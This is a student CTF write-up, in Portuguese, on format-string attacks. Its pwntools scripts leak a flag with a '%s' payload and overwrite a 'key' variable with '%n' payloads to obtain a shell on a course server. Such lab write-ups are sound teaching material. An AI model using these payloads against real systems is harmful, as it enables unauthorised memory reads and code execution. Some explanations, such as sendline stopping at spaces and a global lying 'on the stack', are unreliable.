# CTF Semana 7 - Format String

## Desafio 2 - Primeira Parte

Primeiramente, temos que utilizar o `checksec` para descobrir mais informação sobre o programa:

![image](Semana_7/images/checksec.png)

Como podemos ver, existe um **Stack Canary**, portanto não podemos fazer Buffer Overflow.<br>

Depois, utilizamos o `gdb` para descobrir o endereço da variável global `flag`:

![image](Semana_7/images/gdb.png)

Como podemos observar, o endereço da flag é `0x804c060`. Com este endereço, podemos utilizar um ataque de format string, pois há uma vulnerabilidade no `main.c`, onde são chamados **printf()** sem passar parâmetros de formato. Para fazer o ataque, alteramos o `exploit_example.py` para o seguinte:

```py
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xc0\x04\x08%s")
p.interactive()
```

Devido ao que passamos dentro do **p.sendline()**, que é o endereço da **flag** (em little endian) e o `%s`, o que está naquele endereço será imprimido no terminal.<br>
Com isso, conseguimos obter a flag **flag{a77cc008c6b947169fca32cd56a4b47a}**.

## Desafio 2 - Segunda Parte

Analisando o `main.c`, conseguimos ver que, se o valor da variável global `key` for igual a **0xbeef**, então teremos acesso a uma shell, onde poderemos, de seguida, utilizar o comando `cat` para ler os valores do ficheiro `flag.txt`<br>

Primeiramente, tal como anteriormente, temos que utilizar o `gdb` para saber o endereço da variável `key`:

![image](/Semana_7/images/gdb2.png)

Sabemos, agora, que o endereço da variável `key` é **0x804b324**, portanto, utilizaremos, para escrever em cima desse endereço de memória, o `%n`, que escreve o número de bytes que percorreu no total. Como **0xbeef** em decimal é 48879, teremos que escrever 48879 bytes. Utilizaremos a notação `.Nx` utilizada nos labs. Como temos que escrever no início 4 bytes devido ao `x` e 4 bytes que são o endereço da `key`, então `N = 48879-4-4=48871`

```py
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4005)

p.recvuntil(b"got:")
p.sendline(b"AAAA\x24\xb3\x04\x08.48871x%n")
p.interactive()
```

Com isto, conseguimos obter a flag:

![image](/Semana_7/images/flag2.png)


## Desafio 1 - Extra Dificuldade

Este exercício é semelhante à segunda parte do exercício anterior, no entanto, se utilizarmos o gdb obtemos o seguinte:

![image](/Semana_7/images/gdb3.png)

Como podemos ver, o endereço da `key` é **0x804b320**.<br>
Isto é ligeiramente problemático, pois para escrever nesse endereço fariamos o seguinte:

```py
p.sendline(b"AAAA\x20\xb3\x04\x08.48871x%n")
```

No entanto, o `\x20` é o valor hexadecimal para o espaço, e o **p.sendline()** acaba quando recebe um espaço, portanto, para escrevermos naquele endereço vamos começar a escrever no endereço diretamente anterior a esse dados aleatórios e o resto da mensagem será escrita no endereço correto.<br>
Nós decidimos escrever **0xBEFFFF**, portanto teremos de escrever 12513279 bytes. Como já escrevemos 4 bytes no **AAAA** e mais 4 bytes para o endereço  **0x804b31f**, então `N => 12513279 - 4 - 4 = 12513271`.


```py
from pwn import *

LOCAL = False
if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4008)

p.recvuntil(b"here...")
p.sendline(b"AAAA\x1f\xb3\x04\x08%.12513271x%n")
p.interactive()
```

Desta forma, o endereço **0x804b31f**, que está diretamente acima na stack em relação ao endereço **0x804b320**, terá o valor **0xFF**, e o valor da key será **0xBEEF**.

![image](/Semana_7/images/flaghard.png)

Com isto, conseguimos obter a flag.